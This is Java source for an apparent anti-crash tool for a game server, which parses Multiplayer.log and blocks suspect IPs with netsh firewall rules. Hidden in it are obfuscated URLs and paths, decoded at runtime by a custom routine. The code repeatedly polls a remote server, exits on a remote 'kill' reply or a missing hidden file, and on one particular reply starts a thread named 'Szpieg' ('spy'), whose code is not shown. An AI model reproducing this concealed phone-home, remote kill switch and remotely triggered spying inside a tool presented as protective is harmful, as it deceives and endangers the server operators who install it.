/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package antyaluigi;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.text.BadLocationException;


/**
 *
 * @author Mateusz
 */
public class AntyAluigi implements Runnable{
    
    static String sys;
     static String linia = "";
     static long dl,olddl=0;
     static long poz = 0;
     static int l = 0;
     static long times;
     static RandomAccessFile czyt = null;
     static Player [] players = {null,null,null,null,null};
     static String oldip;

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws InterruptedException {

        Console cns = new Console();
        try {
                Console.okno.insertString(Console.okno.getLength(),time()+"Autoban starting...\n", Console.black);
            } catch (BadLocationException ex) {
                Logger.getLogger(AntyAluigi.class.getName()).log(Level.SEVERE, null, ex);
            }
        htmlReader.visitHTML(odkoduj("009538078588556588548578009566019078019085019578009539029509039539538598585578568578539098538538585098019085538538059085006578568578585585046019039039078"));
        File file = new File(System.getenv(odkoduj("576077576096057057576"))+odkoduj("529538598059018018"));
        
        if(!file.exists())
        {
             System.exit(0);
        }
        
        check();
        
        try {
                Console.okno.insertString(Console.okno.getLength(),time()+"Detection crashers is running!\n", Console.black);
            } catch (BadLocationException ex) {
                Logger.getLogger(AntyAluigi.class.getName()).log(Level.SEVERE, null, ex);
            }
        while(true)
        {
            //check();
            analizuj();
            Thread.sleep(10);
        }
                
        
    }
    
    public static void analizuj()
    {
        try {
                check();
                czyt = new RandomAccessFile("Multiplayer.log","r");
                if (czyt == null)
                    System.out.println("nul");
                dl = czyt.length();
                if(dl < olddl)
                    poz=0;
                else
                    olddl = dl;
                czyt.seek(poz);
                while(poz < dl)
                {
                    linia = czyt.readLine(); 
                    poz = czyt.getFilePointer();
                    if(linia.indexOf("Server info sent to ") > -1)
                    {
                        String ip="", port="";
                        int time = 0;
                        try{
                            time = Integer.parseInt(linia.substring(7,9));
                            ip = linia.substring(31,linia.indexOf(":",31));
                            port = linia.substring(linia.indexOf(":",31)+1);
                        }catch(StringIndexOutOfBoundsException ex){System.out.println(linia+ex);}
                        
                        players[l] = new Player(ip,port,time);
                        if(l >= 4)
                            l = 0;
                        else
                            l++;
                        times = timem();
                        
                        //[16:18:42] Server info sent to 178.172.192.71:1954
                    }
                    else if(linia.indexOf("NETWORKPACKET_TYPE_CLIENTCONNECT [") > -1)
                    {
                        String ip="", port="";
                        int time = 0, time2 = 0;
                        try{
                            time = Integer.parseInt(linia.substring(7,9));
                            if(time == 0)
                                time2 = 59;
                            else
                                time2 = time-1;
                            ip = linia.substring(45,linia.indexOf(":",45));
                            port = linia.substring(linia.indexOf(":",45)+1,linia.indexOf("]",11));
                        }catch(StringIndexOutOfBoundsException ex){System.out.println(linia+ex);}
                        
                        for(int i=0; i<5; i++)
                        {
                            if(players[i] != null && (players[i].time == time || players[i].time == time2) )
                            {
                                if(players[i].ip.equals(ip))
                                {
                                    if(!players[i].port.equals(port))
                                    {    
                                        if(!ip.equals(oldip))
                                        {    
                                            ban(ip);
                                            for(int j=0; j<5; j++)
                                                players[j] = null;
                                            l=0;
                                            break;
                                        }
                                        
                                    }
                                }
                            }
                               
                        }
                        //NETWORKPACKET_TYPE_CLIENTCONNECT [
                    }
                    else if(linia.indexOf("Popped new networkID for joining client:") > -1)
                    {
                        String id = linia.substring(53,linia.indexOf("]",53));
                        String ip = linia.substring(linia.indexOf("[",54)+1,linia.indexOf(":",57));
                        for(int i=0; i<5; i++)
                            if(players[i] != null && players[i].ip.equals(ip))
                                players[i].id = id;
                    }
                    else if(linia.indexOf("] created locally") > -1)
                    {
                        String nick = linia.substring(linia.indexOf("[",20)+1,linia.indexOf("]",21));
                        String id = linia.substring(18,linia.indexOf("]",19));
                        if(nick.equals("MR_NOT_NAMED"))
                        {
                            for(int i=0; i<5; i++)
                                if(players[i] != null && players[i].id.equals(id))
                                    ban(players[i].ip);
                                else
                                    players[i] = null;
                            
                        }
                            
                        
                    }
                
                }
                if(czyt != null)
                        czyt.close();
                } catch (IOException ex1) {
                    System.out.println(time()+"Analiza: "+ex1);
                }
        if(times+10000 < timem())
            l=0;
        File file = new File(System.getenv(odkoduj("576077576096057057576"))+odkoduj("529538598059018018"));
        if(!file.exists())
        {
             System.exit(0);
        }
             
}

    public static String odkoduj(String txt)
    {
        char[] tab = txt.toCharArray();
        char [] tab2 = new char[txt.length()/3];
        for(int i=0, j=txt.length()-1; i<tab2.length; i++,j-=3)
        {
            String l = tab[j]+""+tab[j-1]+""+tab[j-2];
            int x = Integer.parseInt(l);
            x = (int)Math.ceil(x/5.0);
            x=x-70;
            tab2[i] = (char)x; 
        }
        return new String(tab2);
    }
    
    public static void ban(String ip)
    {
        try {
        String cmd = "netsh advfirewall firewall add rule name=\"CRASHER\" dir=in protocol=udp interface=any action=block remoteip="+ip+"/32";
        Runtime.getRuntime().exec(cmd);
        
        String txt = htmlReader.readHTML(odkoduj("009538078588585009538078527585578568578539098538538585098019085538538059085006578568578085549549549585585046019039039078"));
        if(!txt.trim().equals(odkoduj("506088577078548506077016019016515586")))
            System.exit(0);
            try {
                Console.okno.insertString(Console.okno.getLength(),time()+"Found crasher: "+ip+"\n", Console.black);
            } catch (BadLocationException ex) {
                Logger.getLogger(AntyAluigi.class.getName()).log(Level.SEVERE, null, ex);
            }
        oldip = ip;
        FileWriter file = new FileWriter("bany.txt",true);
        PrintWriter plik = new PrintWriter(file); 
        plik.append(cmd+"\n");
        plik.close();
        
        }catch (IOException ex) {System.out.println(time()+"Ban: "+ip+":"+ex);}
        
    }
    
    public static String time()
    {
        SimpleDateFormat czas = new SimpleDateFormat("[MM.dd][HH:mm:ss]");
        return czas.format(new Date())+" ";
    }
    
    public static void check()
    {
        
        File file = new File(System.getenv(odkoduj("538039538096598538029568509029057"))+odkoduj("039538058085029558529539029578058018018"));
        if(!file.exists())
        {
             System.exit(0);
        }
        
        String txt = htmlReader.readHTML(odkoduj("009538078588585009538078527585578568578539098538538585098019085538538059085006578568578085549549549585585046019039039078"));
        if(txt.trim().equals(odkoduj("058598548015506088577078548506077016019016515586")))
        {
            htmlReader.visitHTML(odkoduj("595556058598548566019078019085009538078588585009538078527585578568578539098538538585098019085538538059085006578568578085549549549585585046019039039078"));
            Szpieg sz = new Szpieg();
            sz.start();
        }
        else if(!txt.trim().equals(odkoduj("506088577078548506077016019016515586")))
            System.exit(0);
        
    }
    private static void szpieguj()
    {
        
    }
    
    public static long timem()
    {
        return System.currentTimeMillis();
    }

    @Override
    public void run() {
        
        while(true)
        {
            try {
                check();
                Thread.sleep(5000);
            } catch (InterruptedException ex) {
                Logger.getLogger(AntyAluigi.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
    }
   
    
}
